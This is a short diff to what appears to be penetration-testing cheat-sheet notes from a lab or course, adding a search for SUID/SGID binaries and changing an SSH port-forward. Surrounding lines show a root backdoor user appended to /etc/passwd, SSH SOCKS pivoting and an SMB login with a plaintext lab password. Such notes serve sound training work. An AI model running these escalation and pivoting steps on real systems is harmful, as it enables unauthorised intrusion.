@@ -589,6 +589,7 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ss -anp
 find / -writable -type d 2>/dev/null
 find / -iname "*admin*" 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 ### linpeas
 ```bash
@@ -737,7 +738,7 @@ joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /et
 ### SSH
 ```bash
 # localport
-ssh -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+ssh -L 4455:172.16.50.217:445 database_admin@10.4.50.215
 # l Dynamic
 ## proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
 ssh -D 0.0.0.0:9999 database_admin@10.4.50.215
